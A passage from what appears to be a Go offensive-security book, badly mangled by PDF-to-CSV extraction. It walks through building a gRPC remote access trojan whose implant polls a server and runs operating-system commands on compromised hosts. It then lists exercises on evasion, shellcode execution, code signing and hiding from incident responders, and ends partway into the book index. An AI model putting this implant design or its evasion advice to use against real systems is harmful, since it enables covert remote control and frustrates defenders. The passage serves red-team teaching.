wedon’twantjustanyoneinteractingwithit—,NA,NA
andwewanttohaveourimplantlistenonaportthatyou ,NA,NA
canaccessfromrestrictivenetworks.,NA,NA
"First,wedeclarevariables❶.Weusetwolisteners:onefor ",NA,NA
theimplantserverandonefortheadminserver.We’redoing,NA,NA
thissothatwecanserveouradminAPIonaportseparate,NA,NA
fromourimplantAPI.,NA,NA
Wecreatethechannelswe’lluseforpassingmessages ,NA,NA
betweentheimplantandadminservices❷.Noticethatweuse ,NA,NA
thesamechannelsforinitializingboththeimplantandadmin,NA,NA
serversviacallsto,"NewImplantServer(work,output)",NA
and ,"NewAdminServer(work,output)",NA
❸.Byusingthesamechannel ,NA,NA
"instances,we’relettingouradminandimplantserverstalkto ",NA,NA
eachotheroverthissharedchannel.,NA,NA
"Next,weinitiateournetworklistenersforeachserver, ",NA,NA
bindingour,implantListener,NA
toport4444andour,adminListener,NA
to ,NA,NA
"port9090❹.We’dgenerallyuseport80or443,whichare ",NA,NA
"HTTP/sportsthatarecommonlyallowedtoegressnetworks, ",NA,NA
"butinthisexample,wejustpickedanarbitraryportfortesting ",NA,NA
purposesandtoavoidinterferingwithotherservicesrunning ,NA,NA
onourdevelopmentmachines.,NA,NA
Wehaveournetwork-levellistenersdefined.Nowweset ,NA,NA
upourgRPCserverandAPI.WecreatetwogRPCserver ,NA,NA
instances(oneforouradminAPIandoneforourimplantAPI) ,NA,NA
bycalling,grpc.NewServer(),NA
❺.ThisinitializesthecoregRPC ,NA,NA
serverthatwillhandleallthenetworkcommunicationsand ,NA,NA
suchforus.WejustneedtotellittouseourAPI.Wedothis ,NA,NA
byregisteringinstancesofAPIimplementations(named,"implan
 t",NA
and,admin,NA
inourexample)bycalling ,"grpcapi.RegisterImplantServer(grpcImplantServer,implant)",NA
❻and ,"grpcapi.RegisterAdminServer(grpcAdminServer,admin)",NA
.Noticetha,NA,NA
"t,",NA,NA
althoughwehaveapackagewecreatednamed,grpcapi,NA
",we",NA,NA
neverdefinedthesetwofunctions;the,protoc,NA
commanddid.It,NA,NA
createdthesefunctionsforusin,NA,NA
implant.pb.go,NA,NA
asameansto ,NA,NA
createnewinstancesofourimplantandadmingRPCAPI ,NA,NA
servers.Prettyslick!,NA,NA
"Atthispoint,we’vedefinedtheimplementationsofour ",NA,NA
APIandregisteredthemasgRPCservices.Thelastthingwe ,NA,NA
doisstartourimplantserverbycalling,NA,NA
❼.Wedothisfromwithina ,NA,NA
"goroutinetopreventthecodefromblocking.Afterall,we ",NA,NA
"wanttoalsostartouradminserver,whichwedoviaacallto ",grpcAdminServer.Serve(adminListener),NA
❽.,NA,NA
"Yourserverisnowcomplete,andyoucanstartitby ",NA,NA
running,gorunserver/server.go,NA
".Ofcourse,nothingisinteracting",NA,NA
"withyourserver,sonothingwillhappenyet.Let’smoveonto ",NA,NA
thenextcomponent—ourimplant.,NA,NA
CREATINGTHECLIENTIMPLANT,NA,NA
Theclientimplantisdesignedtorunoncompromised ,NA,NA
systems.Itwillactasabackdoorthroughwhichwecanrun ,NA,NA
"operatingsystemcommands.Inthisexample,theimplantwill ",NA,NA
"periodicallypolltheserver,askingforwork.Ifthereisno ",NA,NA
"worktobedone,nothinghappens.Otherwise,theimplant ",NA,NA
executestheoperatingsystemcommandandsendstheoutput ,NA,NA
backtotheserver.,NA,NA
Listing14-4,NA,NA
showsthecontentsof,NA,NA
implant/implant.go,NA,NA
.,"funcmain(){
  
 var 
  
 ( 
  
 opts[]grpc.DialOption 
  
 conn*grpc.ClientConn
  
 errerror 
  
 clientgrpcapi.ImplantClient❶
  
 )
  
  
 opts=append(opts,grpc.WithInsecure())
  
  
 ifconn,err=grpc.Dial(fmt.Sprintf(""localhost:%d"",4444),opts...);err!=nil{❷
  
 log.Fatal(err)
  
  
 }",NA
Theimplantcodecontainsa,main(),NA
functiononly.Westart,NA,NA
"bydeclaringourvariables,includingoneofthe ",grpcapi.ImplantClient,NA
type❶.The,protoc,NA
commandautomatically ,NA,NA
createdthistypeforus.ThetypehasalltherequiredRPC ,NA,NA
functionstubsnecessarytofacilitateremotecommunication,NA,NA
s.,NA,NA
"Wethenestablishaconnection,via",grpc.Dial(,NA
targetstring,",",NA
opts...DialOption,),NA
",totheimplantserverrunningonport4444",NA,NA
❷.We’llusethisconnectionforthecallto ,grpcapi.NewImplantClient(conn),NA
❸(afunctionthat,protoc,NA
createdfor ,NA,NA
"us).WenowhaveourgRPCclient,whichshouldhavean ",NA,NA
establishedconnectionbacktoourimplantserver.,NA,NA
Ourcodeproceedstouseaninfinite,for,NA
loop❹topollthe ,NA,NA
"implantserver,repeatedlycheckingtoseeifthere’sworkthat ",NA,NA
needstobeperformed.Itdoesthisbyissuingacallto ,"client.FetchCommand(ctx,req)",NA
",passingitarequestcontextand",Empty,NA
"struct❺.Behindthescenes,it’sconnectingtoourAPIserver. ",NA,NA
Iftheresponsewereceivedoesn’thaveanythinginthe,cmd.In,NA
"field,wepausefor3secondsandthentryagain.Whenaunit ",NA,NA
"ofworkisreceived,theimplantsplitsthecommandinto ",NA,NA
individualwordsandargumentsbycalling,"strings.Split(cmd.In,"""")",NA
❻.ThisisnecessarybecauseGo’ssyntaxforexecuting ,NA,NA
operatingsystemcommandsis,exec.Command(,NA
name,",",NA
args,...),NA
",",NA,NA
where,NA,NA
name,NA,NA
isthecommandtoberunand,NA,NA
args,...,NA
isalistof,NA,NA
"anysubcommands,flags,andargumentsusedbythat ",NA,NA
operatingsystemcommand.Godoesthistopreventoperating ,NA,NA
"systemcommandinjection,butitcomplicatesourexecution, ",NA,NA
becausewehavetosplitupthecommandintorelevantpieces ,NA,NA
beforewecanrunit.Werunthecommandandgatheroutput ,NA,NA
byrunning,c.CombinedOutput(),NA
"❼.Lastly,wetakethatoutputand ",NA,NA
initiateagRPCcallto,"client.SendOutput(ctx,cmd)",NA
tosendour ,NA,NA
commandanditsoutputbacktotheserver❽.,NA,NA
"Yourimplantiscomplete,andyoucanrunitvia","gorun
  
 implant/implant.go",NA
".Itshouldconnecttoyourserver.Again,it’llbe",NA,NA
"anticlimactic,asthere’snoworktobeperformed.Justa",NA,NA
"coupleofrunningprocesses,makingaconnectionbutdoing",NA,NA
nothingmeaningful.Let’sfixthat.,NA,NA
BUILDINGTHEADMIN ,NA,NA
COMPONENT,NA,NA
TheadmincomponentisthefinalpiecetoourRAT.It’swhere,NA,NA
"we’llactuallyproducework.Theworkwillgetsent,viaour",NA,NA
"admingRPCAPI,totheserver,whichthenforwardsitonto",NA,NA
theimplant.Theservergetstheoutputfromtheimplantand,NA,NA
sendsitbacktotheadminclient.,NA,NA
Listing14-5,NA,NA
showsthecode,NA,NA
in,NA,NA
client/client.go,NA,NA
.,"funcmain(){
  
 var
  
 (
  
 opts[]grpc.DialOption
  
 conn*grpc.ClientConn
  
 errerror 
  
 clientgrpcapi.AdminClient❶
  
 )
  
 opts=append(opts,grpc.WithInsecure())
  
 ifconn,err=grpc.Dial(fmt.Sprintf(""localhost:%d"",9090),opts...);err!=nil{❷
  
 log.Fatal(err)
  
 }
  
 deferconn.Close() 
  
 client=grpcapi.NewAdminClient(conn)❸varc
 md=new(grpcapi.Command) 
  
 cmd.In=os.Args[1]❹
  
 ctx:=context.Background() 
  
 cmd,err=client.RunCommand(ctx,cmd)❺ifer
 r!=nil{
  
 log.Fatal(err)
  
 }",NA
Westartbydefiningour,grpcapi.AdminClient,NA
"variable❶, ",NA,NA
establishingaconnectiontoouradministrativeserveronport ,NA,NA
"9090❷,andusingtheconnectioninacallto ",grpcapi.NewAdminClient(conn),NA
"❸,creatinganinstanceofouradmin ",NA,NA
gRPCclient.(Rememberthatthe,grpcapi.AdminClient,NA
typeand,grpcapi.NewAdminClient(),NA
functionwerecreatedforusby,protoc,NA
.),NA,NA
"Beforeweproceed,comparethisclientcreationprocesswith ",NA,NA
"thatoftheimplantcode.Noticethesimilarities,butalsothe ",NA,NA
"subtledifferencesintypes,functioncalls,andports.",NA,NA
"Assumingthereisacommandlineargument,wereadthe ",NA,NA
"operatingsystemcommandfromit❹.Ofcourse,thecode ",NA,NA
wouldbemorerobustifwecheckedwhetheranargumentwas ,NA,NA
"passedin,butwe’renotworriedaboutitforthisexample.We ",NA,NA
assignthatcommandstringtothe,cmd.In,NA
.Wepassthis,cmd,NA
",a",*grpcapi.Command,NA
"instance,toourgRPCclient’s","RunCommand(ctx 
 context.Context,cmd*grpcapi.Command)",NA
method❺.Behindthe ,NA,NA
"scenes,thiscommandgetsserializedandsenttotheadmin ",NA,NA
"serverwecreatedearlier.Aftertheresponseisreceived,we ",NA,NA
expecttheoutputtopopulatewiththeoperatingsystem ,NA,NA
commandresults.Wewritethatoutputtotheconsole❻.,NA,NA
RUNNINGTHERAT,NA,NA
"Now,assumingyouhaveboththeserverandtheimplant ",NA,NA
"running,youcanexecuteyouradminclientvia","gorun
  
 client/client.go",NA
command,NA,NA
.Youshouldreceivetheoutputinyour,NA,NA
"adminclientterminalandhaveitdisplayedtothescreen,like ",NA,NA
this:,"$
 gorunclient/client.go'cat/etc/resolv.conf'
  
  
 domainHome
  
  
 nameserver192.168.0.1
  
  
 nameserver205.171.3.25",NA
Thereitis—aworkingRAT.Theoutputshowsthe ,NA,NA
contentsofaremotefile.Runsomeothercommandstosee ,NA,NA
yourimplantinaction.,NA,NA
IMPROVINGTHERAT,NA,NA
"Aswementionedatthebeginningofthischapter,we ",NA,NA
purposelykeptthisRATsmallandfeature-bare.Itwon’tscale ,NA,NA
well.Itdoesn’tgracefullyhandleerrorsorconnection ,NA,NA
"disruptions,anditlacksalotofbasicfeaturesthatallowyou ",NA,NA
"toevadedetection,moveacrossnetworks,escalateprivileges, ",NA,NA
andmore.,NA,NA
"Ratherthanmakingalltheseimprovementsinourexample, ",NA,NA
weinsteadlayoutaseriesofenhancementsthatyoucanmake ,NA,NA
onyourown.We’lldiscusssomeoftheconsiderationsbutwill ,NA,NA
"leaveeachasanexerciseforyou.Tocompletetheseexercises, ",NA,NA
"you’lllikelyneedtorefertootherchaptersofthisbook,dig ",NA,NA
"deeperintoGopackagedocumentation,andexperimentwith ",NA,NA
usingchannelsandconcurrency.It’sanopportunitytoput ,NA,NA
yourknowledgeandskillstoapracticaltest.Goforthand ,NA,NA
"makeusproud,youngPadawan.",NA,NA
EncryptYourCommunications,NA,NA
AllC2utilitiesshouldencrypttheirnetworktraffic!Thisis,NA,NA
especiallyimportantforcommunicationsbetweentheimplan,NA,NA
"t andtheserver,asyoushouldexpecttofindegressnetwork ",NA,NA
monitoringinanymodernenterpriseenvironment.,NA,NA
ModifyyourimplanttouseTLSforthesecommunications.,NA,NA
Thiswillrequireyoutosetadditionalvaluesforthe ,[]grpc.DialOptions,NA
sliceontheclientaswellasontheserver.,NA,NA
"Whileyou’reatit,youshouldprobablyalteryourcodesothat ",NA,NA
"servicesareboundtoadefinedinterface,andlistenand ",NA,NA
connectto,localhost,NA
bydefault.Thiswillpreventunauthorized,NA,NA
access.,NA,NA
"Aconsiderationyou’llhavetomake,particularlyifyou’ll ",NA,NA
beperformingmutualcertificate-,NA,NA
"basedauthentication,ishow ",NA,NA
toadministerandmanagethecertificatesandkeysinthe ,NA,NA
implant.Shouldyouhardcodethem?Storethemremotely?,NA,NA
Derivethematruntimewithsomemagicvoodoothat ,NA,NA
determineswhetheryourimplantisauthorizedtoconnectt,NA,NA
o yourserver?,NA,NA
HandleConnectionDisruptions,NA,NA
"Whilewe’reonthetopicofcommunications,whathappensif ",NA,NA
yourimplantcan’tconnecttoyourserverorifyourserverdies ,NA,NA
witharunningimplant?Youmayhavenoticedthatitbreaks ,NA,NA
"everything—theimplantdies.Iftheimplantdies,well,you’ve ",NA,NA
"lostaccesstothatsystem.Thiscanbeaprettybigdeal, ",NA,NA
particularlyiftheinitialcompromisehappenedinamanner ,NA,NA
that’shardtoreproduce.,NA,NA
Fixthisproblem.Addsomeresiliencetoyourimplantso ,NA,NA
thatitdoesn’timmediatelydieifaconnectionislost.Thiswill ,NA,NA
likelyinvolvereplacingcallsto,log.Fatal(err),NA
inyour,NA,NA
implant.go,NA,NA
filewithlogicthatcalls,grpc.Dial(,NA
targetstring,",",NA
opts,NA,NA
...DialOption,),NA
again.,NA,NA
RegistertheImplants,NA,NA
"You’llwanttobeabletotrackyourimplants.Atpresent,our ",NA,NA
adminclientsendsacommandexpectingonlyasingleimplant ,NA,NA
toexist.Thereisnomeansoftrackingorregisteringan ,NA,NA
"implant,letaloneanymeansofsendingacommandtoa ",NA,NA
specificimplant.,NA,NA
Addfunctionalitythatmakesanimplantregisteritselfwith ,NA,NA
"theserveruponinitialconnection,andaddfunctionalityfor ",NA,NA
theadminclienttoretrievealistofregisteredimplants. ,NA,NA
Perhapsyouassignauniqueintegertoeachimplantorusea ,NA,NA
UUID(checkout,NA,NA
https://github.com/google/uuid/,NA,NA
).Thiswill ,NA,NA
"requirechangestoboththeadminandimplantAPIs,starting ",NA,NA
withyour,NA,NA
implant.proto,NA,NA
file.Adda,RegisterNewImplant,NA
RPC,NA,NA
methodtothe,Implant,NA
"service,andadd",ListRegisteredImplants,NA
tothe,Admin,NA
service.Recompiletheschemawith,protoc,NA
",implementthe",NA,NA
appropriateinterfacemethodsin,NA,NA
server/server.go,NA,NA
",andaddth",NA,NA
e ,NA,NA
newfunctionalitytothelogicin,NA,NA
client/client.go,NA,NA
(fortheadmin ,NA,NA
side)and,NA,NA
implant/implant.go,NA,NA
(fortheimplantside).,NA,NA
AddDatabasePersistence,NA,NA
"Ifyoucompletedthepreviousexercisesinthissection,you ",NA,NA
addedsomeresiliencetotheimplantstowithstandconnection ,NA,NA
"disruptionsandsetupregistrationfunctionality.Atthispoint, ",NA,NA
you’remostlikelymaintainingthelistofregisteredimplants ,NA,NA
inmemoryin,NA,NA
server/server.go,NA,NA
.Whatifyouneedtorestartthe ,NA,NA
"serveroritdies?Yourimplantswillcontinuetoreconnect,but ",NA,NA
"whentheydo,yourserverwillbeunawareofwhichimplants ",NA,NA
"areregistered,becauseyou’llhavelostthemappingofthe",NA,NA
implantstotheirUUID.,NA,NA
Updateyourservercodetostorethisdatainadatabaseof ,NA,NA
yourchoosing.Forafairlyquickandeasysolutionwith ,NA,NA
"minimaldependencies,consideraSQLitedatabase.Several ",NA,NA
Godriversareavailable.Wepersonallyused,NA,NA
go-sqlite3 ,NA,NA
(,NA,NA
https://github.com/mattn/go-sqlite3/,NA,NA
).,NA,NA
SupportMultipleImplants,NA,NA
"Realistically,you’llwanttosupportmultiplesimultaneous ",NA,NA
implantspollingyourserverforwork.Thiswouldmakeyour ,NA,NA
"RATsignificantlymoreuseful,becauseitcouldmanagemore ",NA,NA
"thanasingleimplant,butitrequiresprettysignificantchanges ",NA,NA
aswell.,NA,NA
"That’sbecause,whenyouwishtoexecuteacommandon ",NA,NA
"animplant,you’lllikelywanttoexecuteitonasinglespecific ",NA,NA
"implant,notthefirstonethatpollstheserverforwork.You ",NA,NA
couldrelyontheimplantIDcreatedduringregistrationto ,NA,NA
"keeptheimplantsmutuallyexclusive,andtodirectcommands ",NA,NA
andoutputappropriately.Implementthisfunctionalitysothat ,NA,NA
youcanexplicitlychoosethedestinationimplantonwhichthe ,NA,NA
commandshouldberun.,NA,NA
"Furthercomplicatingthislogic,you’llneedtoconsiderthat ",NA,NA
youmighthavemultipleadminoperatorssendingcommands ,NA,NA
"outsimultaneously,asiscommonwhenworkingwithateam. ",NA,NA
Thismeansthatyou’llprobablywanttoconvertyour,work,NA
and,output,NA
channelsfromunbufferedtobufferedtypes.Thiswill,NA,NA
helpkeepexecutionfromblockingwhentherearemultiple ,NA,NA
"messagesin-flight.However,tosupportthissortof ",NA,NA
"multiplexing,you’llneedtoimplementamechanismthatcan ",NA,NA
"matcharequestorwithitsproperresponse.Forexample,if",NA,NA
"twoadminoperatorssendworksimultaneouslytoimplants, ",NA,NA
theimplantswillgeneratetwoseparateresponses.Ifoperato,NA,NA
r 1sendsthe,ls,NA
commandandoperator2sendsthe,ifconfig,NA
"command,itwouldn’tbeappropriateforoperator1toreceive ",NA,NA
thecommandoutputfor,ifconfig,NA
",andviceversa.",NA,NA
AddImplantFunctionality,NA,NA
Ourimplementationexpectstheimplantstoreceiveandrun ,NA,NA
"operatingsystemcommandsonly.However,otherC2softwar",NA,NA
e containsalotofotherconveniencefunctionsthatwouldbe ,NA,NA
"nicetohave.Forexample,itwouldbenicetobeableto ",NA,NA
uploadordownloadfilestoandfromourimplants.Itmightbe ,NA,NA
"nicetorunrawshellcode,intheeventwewantto,for ",NA,NA
"example,spawnaMeterpretershellwithouttouchingdisk.",NA,NA
Extendthecurrentfunctionalitytosupporttheseaddition,NA,NA
al features.,NA,NA
ChainOperatingSystemCommands,NA,NA
BecauseofthewayGo’s,os/exec,NA
packagecreatesandruns,NA,NA
"commands,youcan’tcurrentlypipetheoutputofone ",NA,NA
"commandasinputintoasecondcommand.Forexample,this ",NA,NA
won’tworkinourcurrentimplementation:,ls-la|wc-l.,NA
Tofix,NA,NA
"this,you’llneedtoplayaroundwiththecommandvariable, ",NA,NA
whichiscreatedwhenyoucall,exec.Command(),NA
tocreatethe,NA,NA
commandinstance.Youcanalterthestdinandstdout ,NA,NA
propertiestoredirectthemappropriately.Whenusedin ,NA,NA
conjunctionwithan,io.Pipe,NA
",youcanforcetheoutputofone",NA,NA
command(,ls-la,NA
",forexample)toactastheinputintoa",NA,NA
subsequentcommand(,wc-l,NA
).,NA,NA
EnhancetheImplant’sAuthenticityandPractice ,NA,NA
GoodOPSEC,NA,NA
GoodOPSEC,NA,NA
Whenyouaddedencryptedcommunicationstotheimplantin ,NA,NA
"thefirstexerciseinthissection,didyouuseaself-signed ",NA,NA
"certificate?Ifso,thetransportandbackendservermayarouse ",NA,NA
"suspicionindevicesandinspectingproxies.Instead,registera ",NA,NA
domainnamebyusingprivateoranonymizedcontactdetails ,NA,NA
inconjunctionwithacertificateauthorityservicetocreatea ,NA,NA
"legitimatecertificate.Further,ifyouhavethemeanstodoso, ",NA,NA
considerobtainingacode-signingcertificatetosignyour ,NA,NA
implantbinary.,NA,NA
"Additionally,considerrevisingthenamingschemeforyour ",NA,NA
"sourcecodelocations.Whenyoubuildyourbinaryfile,the ",NA,NA
filewillincludepackagepaths.Descriptivepathnamesmay ,NA,NA
"leadincidentrespondersbacktoyou.Further,whenbuilding ",NA,NA
"yourbinary,considerremovingdebugginginformation.This ",NA,NA
hastheaddedbenefitofmakingyourbinarysizesmallerand ,NA,NA
moredifficulttodisassemble.Thefollowingcommandcan ,NA,NA
achievethis:,"$
 gobuild-ldflags=""-s-w""implant/implant.go",NA
Theseflagsarepassedtothelinkertoremovedebugging ,NA,NA
informationandstripthebinary.,NA,NA
AddASCIIArt,NA,NA
"Yourimplementationcouldbeahotmess,butifithasASCII ",NA,NA
"art,it’slegitimate.Okay,we’renotseriousaboutthat.But ",NA,NA
"everysecuritytoolseemstohaveASCIIartforsomereason, ",NA,NA
somaybeyoushouldaddittoyours.Greetzoptional.,NA,NA
SUMMARY,NA,NA
"Goisagreatlanguageforwritingcross-platformimplants, ",NA,NA
liketheRATyoubuiltinthischapter.Creatingtheimplant ,NA,NA
"waslikelythemostdifficultpartofthisproject,becauseusing ",NA,NA
Gotointeractwiththeunderlyingoperatingsystemcanbe ,NA,NA
challengingcomparedtolanguagesdesignedfortheoperating ,NA,NA
"systemAPI,suchasC#andtheWindowsAPI.Additionally, ",NA,NA
"becauseGobuildstoastaticallycompiledbinary,implants ",NA,NA
"mayresultinalargebinarysize,whichmayaddsome ",NA,NA
restrictionsondelivery.,NA,NA
"Butforbackendservices,thereissimplynothingbetter.",NA,NA
Oneoftheauthorsofthisbook(Tom)hasanongoingbetwith ,NA,NA
anotherauthor(Dan)thatifheeverswitchesfromusingGo ,NA,NA
"forbackendservicesandgeneralutility,he’llhavetopay ",NA,NA
"$10,000.Thereisnosignofhimswitchinganytimesoon ",NA,NA
(althoughElixirlookscool).Usingallthetechniques ,NA,NA
"describedinthisbook,youshouldhaveasolidfoundationto ",NA,NA
startbuildingsomerobustframeworksandutilities.,NA,NA
Wehopeyouenjoyedreadingthisbookandparticipating ,NA,NA
intheexercisesasmuchaswedidwritingit.Weencourage ,NA,NA
youtokeepwritingGoandusetheskillslearnedinthisbook ,NA,NA
tobuildsmallutilitiesthatenhanceorreplaceyourcurrent ,NA,NA
"tasks.Then,asyougainexperience,startworkingonlarger ",NA,NA
codebasesandbuildsomeawesomeprojects.Tocontinue ,NA,NA
"growingyourskills,lookatsomeofthemorepopularlarge ",NA,NA
"Goprojects,particularlyfromlargeorganizations.Watchtalks ",NA,NA
"fromconferences,suchasGopherCon,thatcanguideyou ",NA,NA
"throughmoreadvancedtopics,andhavediscussionsonpitfall",NA,NA
"s andwaystoenhanceyourprogramming.Mostimportantly, ",NA,NA
"havefun—andifyoubuildsomethingneat,tellusaboutit! ",NA,NA
Catchyouontheflippity-flip.,NA,NA
INDEX,NA,NA
A,NA,NA
"Arecords,",NA,NA
104,NA,NA
",",NA,NA
109,NA,NA
–,NA,NA
111 ,NA,NA
"AbstractSyntaxNotationOne(ASN.1)encoding,",NA,NA
133,NA,NA
–,NA,NA
135,NA,NA
", ",NA,NA
137,NA,NA
–,NA,NA
138 ,acme/autocert,NA
",",NA,NA
235,"Add(
 int
 )",NA
",",NA,NA
27,NA,NA
"AddressResolutionProtocol(ARP)poisoning,",NA,NA
178 ,NA,NA
"AdvancedEncryptionStandard(AES)algorithm,",NA,NA
242 ,NA,NA
"ancillarychunks,",NA,NA
302 ,NA,NA
"anonymousfunctions,",NA,NA
126 ,NA,NA
APIinteraction ,NA,NA
"overview,",NA,NA
51,NA,NA
–,NA,NA
53 ,NA,NA
"Bingscraping,",NA,NA
68,NA,NA
–,NA,NA
76 ,NA,NA
"Metasploit,",NA,NA
59,NA,NA
–,NA,NA
68 ,NA,NA
"Shodan,",NA,NA
51,NA,NA
–,NA,NA
59 ,APIInfo,NA
"struct,",NA,NA
55,append(),NA
"function,",NA,NA
11,NA,NA
"ARP(AddressResolutionProtocol)poisoning,",NA,NA
178 ,NA,NA
"ASN.1(AbstractSyntaxNotationOne)encoding,",NA,NA
133,NA,NA
–,NA,NA
135,NA,NA
", ",NA,NA
137,NA,NA
–,NA,NA
138 ,NA,NA
"assembly,",NA,NA
216 ,NA,NA
"asymmetricalgorithms,",NA,NA
234 ,NA,NA
"asymmetriccryptography,",NA,NA
245,NA,NA
.,NA,NA
Seealso,NA,NA
encryption ,NA,NA
"Atom,GitHub,",NA,NA
4,NA,NA
–,NA,NA
5,HivaNetwork.Com,NA
"authentication,",NA,NA
67,NA,NA
",",NA,NA
86,NA,NA
–,NA,NA
88,NA,NA
",",NA,NA
239,NA,NA
–,NA,NA
241,NA,NA
B,NA,NA
"backticks,",NA,NA
19 ,NA,NA
"baseworkspacedirectory,",NA,NA
2 ,NA,NA
"Base64encoding,",NA,NA
215,NA,NA
–,NA,NA
216 ,NA,NA
"bcrypthashing,",NA,NA
235,NA,NA
",",NA,NA
237,NA,NA
–,NA,NA
239 ,NA,NA
"Beacon,",NA,NA
121 ,NA,NA
"BerkeleyPacketFilter(BPF),",NA,NA
175,NA,NA
",",NA,NA
181,NA,NA
.,NA,NA
Seealso,NA,NA
tcpdump ,NA,NA
bestpractices ,NA,NA
"coding,",NA,NA
19,NA,NA
",",NA,NA
49,NA,NA
",",NA,NA
66,NA,NA
",",NA,NA
185,NA,NA
",",NA,NA
195,NA,NA
",",NA,NA
329 ,NA,NA
"security,",NA,NA
96,NA,NA
",",NA,NA
236 ,NA,NA
"bindirectory,",NA,NA
2 ,NA,NA
"binaries,",NA,NA
2 ,NA,NA
"binarydatahandling,",NA,NA
213,NA,NA
–,NA,NA
216 ,NA,NA
"Bing,",NA,NA
68,NA,NA
–,NA,NA
76 ,bodyType,NA
"parameter,",NA,NA
46,braces,NA
",",NA,NA
14,break,NA
"statements,",NA,NA
14,NA,NA
"bruteforce,",NA,NA
252,NA,NA
–,NA,NA
261 ,NA,NA
"bufferoverflowfuzzing,",NA,NA
188,NA,NA
–,NA,NA
192 ,NA,NA
"bufferedchannels,",NA,NA
29,NA,NA
",",NA,NA
37,NA,NA
–,NA,NA
39 ,bufio,NA
"package,",NA,NA
38,NA,NA
",",NA,NA
112,NA,NA
–,NA,NA
113,NA,NA
",",NA,NA
197,build,NA
"command,",NA,NA
7,NA,NA
"buildconstraints,",NA,NA
7,NA,NA
–,NA,NA
8 ,byte,NA
"slices,",NA,NA
19,bytes,NA
"package,",NA,NA
197,NA,NA
C,NA,NA
"C,",NA,NA
201,NA,NA
–,NA,NA
212,NA,NA
",",NA,NA
290,NA,NA
–,NA,NA
293 ,C,NA
"transform,",NA,NA
213,NA,NA
"CaddyServer,",NA,NA
127 ,.Call(),NA
"method,",NA,NA
273,NA,NA
"canonicalname(CNAME)records,",NA,NA
109,NA,NA
–,NA,NA
111 ,capture(),NA
"function,",NA,NA
184,NA,NA
"CGOpackage,",NA,NA
291 ,NA,NA
"channels,",NA,NA
16,NA,NA
–,NA,NA
17 ,Checker,NA
"interface,",NA,NA
220,NA,NA
–,NA,NA
222,NA,NA
"CipherBlockChaining(CBC)mode,",NA,NA
242 ,NA,NA
"ciphertext,",NA,NA
234 ,NA,NA
cleartext ,NA,NA
"overview,",NA,NA
234 ,NA,NA
"passwords,",NA,NA
150 ,NA,NA
"sniffing,",NA,NA
178,NA,NA
–,NA,NA
180 ,NA,NA
"clientimplants,",NA,NA
323,NA,NA
–,NA,NA
325,NA,NA
",",NA,NA
327,NA,NA
–,NA,NA
329 ,Client,NA
"struct,",NA,NA
53,NA,NA
–,NA,NA
54,NA,NA
"clonedsites,",NA,NA
90,NA,NA
–,NA,NA
93 ,Close(),NA
"method,",NA,NA
25,NA,NA
"closedports,",NA,NA
22 ,Cmd,NA
",",NA,NA
41,NA,NA
"CNAMErecords,",NA,NA
109,NA,NA
–,NA,NA
111 ,NA,NA
"CobaltStrike,",NA,NA
118,NA,NA
–,NA,NA
124,NA,NA
",",NA,NA
278 ,NA,NA
"COFFFileHeader,",NA,NA
282,NA,NA
–,NA,NA
283 ,NA,NA
"collision,",NA,NA
234 ,Command(),NA
"function,",NA,NA
41,NA,NA
commands ,build,NA
"command,",NA,NA
7 ,NA,NA
"cross-compiling,",NA,NA
7,NA,NA
–,NA,NA
8 ,go,NA
"commands,",NA,NA
6,NA,NA
–,NA,NA
9 ,set,NA
"command,",NA,NA
3,NA,NA
"complexdatatypes,",NA,NA
10,NA,NA
–,NA,NA
11 ,NA,NA
"concurrency,",NA,NA
16,NA,NA
–,NA,NA
17,NA,NA
",",NA,NA
37 ,NA,NA
"concurrentscanning,",NA,NA
26,NA,NA
–,NA,NA
32 ,Conn,NA
",",NA,NA
35,NA,NA
–,NA,NA
38,NA,NA
"connections,",NA,NA
24,NA,NA
–,NA,NA
25,NA,NA
",",NA,NA
35,NA,NA
",",NA,NA
327 ,NA,NA
"constraints,",NA,NA
7,NA,NA
–,NA,NA
8 ,NA,NA
"controlstructures,",NA,NA
14,NA,NA
–,NA,NA
16 ,NA,NA
"conveniencefunctions,",NA,NA
46,NA,NA
–,NA,NA
47,NA,NA
",",NA,NA
140 ,Copy(),NA
"function,",NA,NA
40,createChunkCRC(),NA
"method,",NA,NA
304,NA,NA
–,NA,NA
305,CreateRemoteThread(),NA
"Windowsfunction,",NA,NA
275,NA,NA
–,NA,NA
276,NA,NA
"credential-harvestingattacks,",NA,NA
90,NA,NA
–,NA,NA
93 ,NA,NA
"criticalchunks,",NA,NA
302 ,NA,NA
"cross-compiling,",NA,NA
7,NA,NA
–,NA,NA
8 ,NA,NA
"cross-sitescripting,",NA,NA
94 ,crypto,NA
"package,",NA,NA
197,NA,NA
",",NA,NA
235,NA,NA
cryptography ,NA,NA
"overview,",NA,NA
234,NA,NA
–,NA,NA
235 ,NA,NA
"hashing,",NA,NA
234,NA,NA
–,NA,NA
239 ,curl,NA
",",NA,NA
40,NA,NA
",",NA,NA
79,NA,NA
D,NA,NA
"DataDirectory,",NA,NA
285,NA,NA
–,NA,NA
287 ,NA,NA
"datamapping,",NA,NA
71,NA,NA
–,NA,NA
73,NA,NA
",",NA,NA
125 ,NA,NA
datatypes ,NA,NA
"channels,",NA,NA
16 ,NA,NA
"maps,",NA,NA
11 ,NA,NA
"primitive,",NA,NA
10,NA,NA
–,NA,NA
11 ,NA,NA
"slices,",NA,NA
11 ,NA,NA
"databaseminers,",NA,NA
161,NA,NA
–,NA,NA
170 ,debug,NA
"package,",NA,NA
197,NA,NA
"decoderfunction,",NA,NA
300 ,NA,NA
"decodingprocess,",NA,NA
308 ,NA,NA
"decryption,",NA,NA
234,NA,NA
.,NA,NA
Seealso,NA,NA
encryption ,DefaultServerMux,NA
",",NA,NA
78,NA,NA
–,NA,NA
79,defer,NA
",",NA,NA
49,NA,NA
"DELETErequests,",NA,NA
47,NA,NA
–,NA,NA
48 ,dep,NA
"tool,",NA,NA
9,NA,NA
"developmentenvironmentsetup,",NA,NA
1,NA,NA
–,NA,NA
10 ,Dial(),NA
"method,",NA,NA
24,NA,NA
"dialects,",NA,NA
132,NA,NA
–,NA,NA
133 ,NA,NA
"directives,",NA,NA
19 ,NA,NA
"DirtyCOW,",NA,NA
201,NA,NA
–,NA,NA
204 ,NA,NA
"DNSclients,",NA,NA
104,NA,NA
–,NA,NA
117 ,NA,NA
"DNSproxies,",NA,NA
124,NA,NA
–,NA,NA
127 ,NA,NA
"DNSservers,",NA,NA
117,NA,NA
–,NA,NA
129 ,NA,NA
"DNStunneling,",NA,NA
121 ,do,NA
"loops,",NA,NA
15,NA,NA
"Docker,",NA,NA
90,NA,NA
",",NA,NA
118,NA,NA
–,NA,NA
122,NA,NA
